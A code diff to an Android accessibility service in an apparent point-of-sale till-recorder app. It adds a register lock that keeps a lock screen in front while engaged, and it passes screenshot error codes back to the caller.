@@ -3,6 +3,7 @@ package com.tillrecorder.agent
 import android.accessibilityservice.AccessibilityService
 import android.content.ComponentName
 import android.content.Context
+import android.content.Intent
 import android.graphics.Bitmap
 import android.hardware.HardwareBuffer
 import android.os.Build
@@ -34,27 +35,36 @@ class TillAccessibilityService : AccessibilityService() {
         super.onDestroy()
     }
 
-    override fun onAccessibilityEvent(event: AccessibilityEvent?) = Unit
+    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
+        if (!RegisterLock.isEngaged()) return
+        if (event?.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
+        if (event.className == RegisterLockActivity::class.java.name) return
+        RegisterLockActivity.show(this)
+    }
 
     override fun onInterrupt() = Unit
 
-    fun capture(onBitmap: (Bitmap?) -> Unit) {
+    fun bringLockForward(intent: Intent) {
+        startActivity(intent)
+    }
+
+    fun capture(onBitmap: (Bitmap?, Int) -> Unit) {
         if (Build.VERSION.SDK_INT < 30) {
-            onBitmap(null)
+            onBitmap(null, 1)
             return
         }
         takeScreenshot(Display.DEFAULT_DISPLAY, executor, screenshotCallback(onBitmap))
     }
 
     @RequiresApi(30)
-    private fun screenshotCallback(onBitmap: (Bitmap?) -> Unit): TakeScreenshotCallback {
+    private fun screenshotCallback(onBitmap: (Bitmap?, Int) -> Unit): TakeScreenshotCallback {
         return object : TakeScreenshotCallback {
             override fun onSuccess(screenshot: ScreenshotResult) {
-                onBitmap(bitmapFrom(screenshot))
+                onBitmap(bitmapFrom(screenshot), 0)
             }
 
             override fun onFailure(errorCode: Int) {
-                onBitmap(null)
+                onBitmap(null, errorCode)
             }
         }
     }
